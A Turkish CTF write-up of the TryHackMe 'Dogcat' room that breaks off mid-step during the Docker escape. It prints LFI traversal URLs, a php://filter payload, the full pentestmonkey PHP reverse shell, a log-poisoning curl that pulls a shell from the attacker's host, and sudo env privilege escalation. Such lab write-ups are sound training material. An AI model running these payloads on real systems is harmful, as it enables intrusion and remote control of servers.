<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>THM Dogcat Çözüm | order6tyfix</title>
  <meta name="author" content="order6tyfix">
  
  <meta name="description" content="Makine Linki
RECON(Bilgi Toplama)
Nmap taramasıyla makineyı çözümlemeye başlıyorum.
12345678910111213nmap -sS -sV 10.10.227.89Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-16 23:34 +03Nmap scan report for 10.10.227.89Host is up (0.15s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.38 ((Debian))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.84 seconds
80 portunda bir apache web sunucusu var. Siteye girdiğimde dog ve cat adında iki seçenek var. Seçenekler önümüze rastgele(!) kedi veya köpek fotoğrafları çıkartıyor. URL’ye baktığım zaman LFI(Local File Inclusion)‘a müsait olabileceğini düşünüyorum çünkü web sitesin çalışma prensibi sunucudaki dosyaları çağırmak üzerine. 
http://10.10.227.89/?view=dog


    
İlk denediğim şey sistemdeki kullanıcıları görmek için etc/passwd ‘ye erişmek.
http://10.10.227.89/?view=dog/../../../../etc/passwd


    
Site error mesajı döndürdüğünden LFI olduğuna artık eminim.
Warning: include(dog/../../../../etc/passwd.php): failed to open stream: No such file or         directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening &amp;#39;dog/../../../../etc/passwd.php&amp;#39; for inclusion         (include_path=&amp;#39;.:/usr/local/lib/php&amp;#39;) in /var/www/html/index.php on line 24">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="THM Dogcat Çözüm"/>
  <meta property="og:site_name" content="order6tyfix"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-70812759-1', 'auto');
  ga('send', 'pageview');
</script>



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

  <meta name="google-site-verification" content="3rmbjRm8lV6IvILUmHkuMJMbbUgfoZd6Z83DjdlvMn8" />

<meta name="generator" content="Hexo 6.0.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">order6tyfix</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Arsiv
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class=""></i>Kategoriler
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Etiketler
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>Hakkımda
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> THM Dogcat Çözüm</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p><a target="_blank" rel="noopener" href="https://tryhackme.com/room/dogcat">Makine Linki</a></p>
<h1 id="RECON-Bilgi-Toplama"><a href="#RECON-Bilgi-Toplama" class="headerlink" title="RECON(Bilgi Toplama)"></a>RECON(Bilgi Toplama)</h1><hr>
<p>Nmap taramasıyla makineyı çözümlemeye başlıyorum.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV 10.10.227.89</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-16 23:34 +03</span><br><span class="line">Nmap scan report for 10.10.227.89</span><br><span class="line">Host is up (0.15s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.84 seconds</span><br></pre></td></tr></table></figure>
<p>80 portunda bir apache web sunucusu var. Siteye girdiğimde dog ve cat adında iki seçenek var. Seçenekler önümüze rastgele(!) kedi veya köpek fotoğrafları çıkartıyor. URL’ye baktığım zaman <a target="_blank" rel="noopener" href="https://aycaakcay.medium.com/file-inclusion-nedir-da2f2218383f">LFI(Local File Inclusion)</a>‘a müsait olabileceğini düşünüyorum çünkü web sitesin çalışma prensibi sunucudaki dosyaları çağırmak üzerine. </p>
<pre><code>http://10.10.227.89/?view=dog
</code></pre>
</br>
    
<p>İlk denediğim şey sistemdeki kullanıcıları görmek için <code>etc/passwd</code> ‘ye erişmek.</p>
<pre><code>http://10.10.227.89/?view=dog/../../../../etc/passwd
</code></pre>
</br>
    
<p>Site error mesajı döndürdüğünden LFI olduğuna artık eminim.</p>
<pre><code>Warning: include(dog/../../../../etc/passwd.php): failed to open stream: No such file or         directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening &#39;dog/../../../../etc/passwd.php&#39; for inclusion         (include_path=&#39;.:/usr/local/lib/php&#39;) in /var/www/html/index.php on line 24
</code></pre>
</br>

<span id="more"></span>

<h1 id="EXPLOITATION-Sistemi-Somurme"><a href="#EXPLOITATION-Sistemi-Somurme" class="headerlink" title="EXPLOITATION(Sistemi Sömürme)"></a>EXPLOITATION(Sistemi Sömürme)</h1><hr>
<p>Error mesajında girdiye “.php” uzantısı eklediğini fark ettim. Php için LFI tekniklerini araştırdığımda <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/file-inclusion">PHP wrappers</a>‘a denk geldim.<code>php://filter</code> kullanarak index dosyasını okuyabilir ve sitenin çalışma prensibini daha iyi anlayabilirim. Bunun için kullanacağım payload:<br></br></p>
<pre><code>http://10.10.227.89/?view=php://filter/convert.base64-encode/resource=dog/../index
</code></pre>
</br>

<p>Sitenin geri dönütündeki base64 çıktısını decode ettiğimde artık elimde index dosyasının içeriği var.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">	&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;dogcat&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/style.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;dogcat&lt;/h1&gt;</span><br><span class="line">    &lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h2&gt;What would you like to see?&lt;/h2&gt;</span><br><span class="line">        &lt;a href=&quot;/?view=dog&quot;&gt;&lt;button id=&quot;dog&quot;&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href=&quot;/?view=cat&quot;&gt;&lt;button id=&quot;cat&quot;&gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">            function containsStr($str, $substr) &#123;</span><br><span class="line">                return strpos($str, $substr) !== false;</span><br><span class="line">            &#125;</span><br><span class="line">	    $ext = isset($_GET[&quot;ext&quot;]) ? $_GET[&quot;ext&quot;] : &#x27;.php&#x27;;</span><br><span class="line">            if(isset($_GET[&#x27;view&#x27;])) &#123;</span><br><span class="line">                if(containsStr($_GET[&#x27;view&#x27;], &#x27;dog&#x27;) || containsStr($_GET[&#x27;view&#x27;], &#x27;cat&#x27;)) &#123;</span><br><span class="line">                    echo &#x27;Here you go!&#x27;;</span><br><span class="line">                    include $_GET[&#x27;view&#x27;] . $ext;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    echo &#x27;Sorry, only dogs or cats are allowed.&#x27;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>kaynak kod’da ext değişkenin belirtilmediği takdirde “php” olarak varsayılacağını anladım, yani ext değişkenini manipüle edebilirim.</p>
<pre><code>http://10.10.227.89/?view=dog/../../../../etc/passwd&amp;ext=
</code></pre>
<p>Artık passwd dosyasını okuyabiliyorum. Fakat asıl işime yarayacak metot <a href ="https://www.youtube.com/watch?v=bPrSSScB4-c">Log Poisoning</a>. Bu sayede log dosyasına hangi request header’ların dahil edildiğini tespit edebilir, devamında belki bu parametrede bir php kodu çalıştırabilirim. Bunun için apache log dosyasını açıyorum:</p>
<pre><code>http://10.10.221.0/?view=cat../../../../../var/log/apache2/access.log&amp;ext=
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.8.216.50 - - [17/Feb/2022:17:23:33 +0000] &quot;GET /?view=cat../../../../../var/log/apache2/access.log&amp;ext= HTTP/1.1&quot; 200 742 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0&quot;</span><br><span class="line">10.8.216.50 - - [17/Feb/2022:17:23:33 +0000] &quot;GET /style.css HTTP/1.1&quot; 200 698 &quot;http://10.10.116.202/?view=cat../../../../../var/log/apache2/access.log&amp;ext=&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0&quot;</span><br><span class="line">10.8.216.50 - - [17/Feb/2022:17:23:33 +0000] &quot;GET /favicon.ico HTTP/1.1&quot; 404 491 &quot;http://10.10.116.202/?view=cat../../../../../var/log/apache2/access.log&amp;ext=&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0&quot;</span><br></pre></td></tr></table></figure>

<p>User-agent <code>encode edilmemiş bir şekilde</code> log dosyasında saklanıyor<code>(Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0)</code>. Bu da demek oluyor ki user-agent parametresine bir php kodu yerleştirip çalıştırılmasını sağlayabilirim.</p>
<p>İlk önce php için bir reverse shell kodu buldum:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// php-reverse-shell - A Reverse Shell implementation in PHP</span><br><span class="line">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="line">// for any actions performed using this tool.  The author accepts no liability</span><br><span class="line">// for damage caused by this tool.  If these terms are not acceptable to you, then</span><br><span class="line">// do not use this tool.</span><br><span class="line">//</span><br><span class="line">// In all other respects the GPL version 2 applies:</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License version 2 as</span><br><span class="line">// published by the Free Software Foundation.</span><br><span class="line">//</span><br><span class="line">// This program is distributed in the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License for more details.</span><br><span class="line">//</span><br><span class="line">// You should have received a copy of the GNU General Public License along</span><br><span class="line">// with this program; if not, write to the Free Software Foundation, Inc.,</span><br><span class="line">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span><br><span class="line">//</span><br><span class="line">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="line">// for any actions performed using this tool.  If these terms are not acceptable to</span><br><span class="line">// you, then do not use this tool.</span><br><span class="line">//</span><br><span class="line">// You are encouraged to send comments, improvements or suggestions to</span><br><span class="line">// me at pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// Description</span><br><span class="line">// -----------</span><br><span class="line">// This script will make an outbound TCP connection to a hardcoded IP and port.</span><br><span class="line">// The recipient will be given a shell running as the current user (apache normally).</span><br><span class="line">//</span><br><span class="line">// Limitations</span><br><span class="line">// -----------</span><br><span class="line">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span><br><span class="line">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span><br><span class="line">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span><br><span class="line">//</span><br><span class="line">// Usage</span><br><span class="line">// -----</span><br><span class="line">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line">$VERSION = &quot;1.0&quot;;</span><br><span class="line">$ip = &#x27;10.8.216.50&#x27;;  // CHANGE THIS</span><br><span class="line">$port = 1234;       // CHANGE THIS</span><br><span class="line">$chunk_size = 1400;</span><br><span class="line">$write_a = null;</span><br><span class="line">$error_a = null;</span><br><span class="line">$shell = &#x27;uname -a; w; id; /bin/sh -i&#x27;;</span><br><span class="line">$daemon = 0;</span><br><span class="line">$debug = 0;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Daemonise ourself if possible to avoid zombies later</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="line">// our php process and avoid zombies.  Worth a try...</span><br><span class="line">if (function_exists(&#x27;pcntl_fork&#x27;)) &#123;</span><br><span class="line">	// Fork and have the parent process exit</span><br><span class="line">	$pid = pcntl_fork();</span><br><span class="line">	</span><br><span class="line">	if ($pid == -1) &#123;</span><br><span class="line">		printit(&quot;ERROR: Can&#x27;t fork&quot;);</span><br><span class="line">		exit(1);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	if ($pid) &#123;</span><br><span class="line">		exit(0);  // Parent exits</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Make the current process a session leader</span><br><span class="line">	// Will only succeed if we forked</span><br><span class="line">	if (posix_setsid() == -1) &#123;</span><br><span class="line">		printit(&quot;Error: Can&#x27;t setsid()&quot;);</span><br><span class="line">		exit(1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$daemon = 1;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Change to a safe directory</span><br><span class="line">chdir(&quot;/&quot;);</span><br><span class="line"></span><br><span class="line">// Remove any umask we inherited</span><br><span class="line">umask(0);</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Do the reverse shell...</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// Open reverse connection</span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><br><span class="line">if (!$sock) &#123;</span><br><span class="line">	printit(&quot;$errstr ($errno)&quot;);</span><br><span class="line">	exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Spawn shell process</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from</span><br><span class="line">   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to</span><br><span class="line">   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$process = proc_open($shell, $descriptorspec, $pipes);</span><br><span class="line"></span><br><span class="line">if (!is_resource($process)) &#123;</span><br><span class="line">	printit(&quot;ERROR: Can&#x27;t spawn shell&quot;);</span><br><span class="line">	exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Set everything to non-blocking</span><br><span class="line">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span><br><span class="line">stream_set_blocking($pipes[0], 0);</span><br><span class="line">stream_set_blocking($pipes[1], 0);</span><br><span class="line">stream_set_blocking($pipes[2], 0);</span><br><span class="line">stream_set_blocking($sock, 0);</span><br><span class="line"></span><br><span class="line">printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span><br><span class="line"></span><br><span class="line">while (1) &#123;</span><br><span class="line">	// Check for end of TCP connection</span><br><span class="line">	if (feof($sock)) &#123;</span><br><span class="line">		printit(&quot;ERROR: Shell connection terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Check for end of STDOUT</span><br><span class="line">	if (feof($pipes[1])) &#123;</span><br><span class="line">		printit(&quot;ERROR: Shell process terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Wait until a command is end down $sock, or some</span><br><span class="line">	// command output is available on STDOUT or STDERR</span><br><span class="line">	$read_a = array($sock, $pipes[1], $pipes[2]);</span><br><span class="line">	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span><br><span class="line"></span><br><span class="line">	// If we can read from the TCP socket, send</span><br><span class="line">	// data to process&#x27;s STDIN</span><br><span class="line">	if (in_array($sock, $read_a)) &#123;</span><br><span class="line">		if ($debug) printit(&quot;SOCK READ&quot;);</span><br><span class="line">		$input = fread($sock, $chunk_size);</span><br><span class="line">		if ($debug) printit(&quot;SOCK: $input&quot;);</span><br><span class="line">		fwrite($pipes[0], $input);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// If we can read from the process&#x27;s STDOUT</span><br><span class="line">	// send data down tcp connection</span><br><span class="line">	if (in_array($pipes[1], $read_a)) &#123;</span><br><span class="line">		if ($debug) printit(&quot;STDOUT READ&quot;);</span><br><span class="line">		$input = fread($pipes[1], $chunk_size);</span><br><span class="line">		if ($debug) printit(&quot;STDOUT: $input&quot;);</span><br><span class="line">		fwrite($sock, $input);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// If we can read from the process&#x27;s STDERR</span><br><span class="line">	// send data down tcp connection</span><br><span class="line">	if (in_array($pipes[2], $read_a)) &#123;</span><br><span class="line">		if ($debug) printit(&quot;STDERR READ&quot;);</span><br><span class="line">		$input = fread($pipes[2], $chunk_size);</span><br><span class="line">		if ($debug) printit(&quot;STDERR: $input&quot;);</span><br><span class="line">		fwrite($sock, $input);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[0]);</span><br><span class="line">fclose($pipes[1]);</span><br><span class="line">fclose($pipes[2]);</span><br><span class="line">proc_close($process);</span><br><span class="line"></span><br><span class="line">// Like print, but does nothing if we&#x27;ve daemonised ourself</span><br><span class="line">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="line">function printit ($string) &#123;</span><br><span class="line">	if (!$daemon) &#123;</span><br><span class="line">		print &quot;$string\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>IP ve PORT parametrelerini kendinize göre düzenlemeniz gerekiyor. Ben PORT için 1234 seçtim.<br>sunucudan reverse shell bağlantısı geldiğinde yakalayabilmek için:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>

<p>ardından kodun bulunduğu dizinde basit bir sunucu servis etmeye başladım.</p>
<pre><code>python3 -m http.server    
</code></pre>
<p>Bir curl isteği ile <code>shell.php</code> dosyamı sunucuya çekmem gerekiyor.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;10.10.30.6&quot; -H &quot;User-Agent: &lt;?php file_put_contents(&#x27;shell.php&#x27;,file_get_contents(&#x27;http://10.8.216.50:8000/shell.php&#x27;))?&gt;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>isteği gönderdikten sonra web tarayıcısında sayfayı yeniledim ve artık <code>shell.php</code> dosyası sunucuda. Web tarayıcısında <code>10.10.30.6/shell.php</code> sayfasına gittiğimde netcat’e reverse shell gelmiş oldu.</p>
<h1 id="PRIV-ESC-Yetki-Yukseltme"><a href="#PRIV-ESC-Yetki-Yukseltme" class="headerlink" title="PRIV ESC(Yetki Yükseltme)"></a>PRIV ESC(Yetki Yükseltme)</h1><hr>
<p>İlk yapacağım şey <code>sudo -l</code> ile root yetkisi ile çalıştırabileceğim komutları listelemek.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for www-data on e6ba91bdb0c7:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on e6ba91bdb0c7:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/env</span><br></pre></td></tr></table></figure>
<p><a href= "https://gtfobins.github.io/gtfobins/env/">GTFObins</a>‘de env için yetki yükseltme teknikleri buldum. <code>sudo env /bin/sh</code> uyguladığımda artık sistemde yetkili kullanıcıyım.</p>
<p>flag3’de makinanın farklı bir ortamda çalıştığı ipucunu aldım ve kontrol etmek için kök dizinde <code>ls -la</code> çalılştırdığımda bir docker içinde olduğumu anladım. Docker’dan çıkmak için sisteme sonradan kurulan paketlerin bulunduğu <code>/opt</code> klasörüne gidiyorum. <code>/backups</code> klasöründe <code>backup.sh</code> ‘ın içine reverse shell için bir bash komutu yazmam yeterli olacak.</p>
<p>İlk önce kendi makinemda netcat ile dinlemeye aldım.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure>
<p>ardından dogcat makinesında:</p>
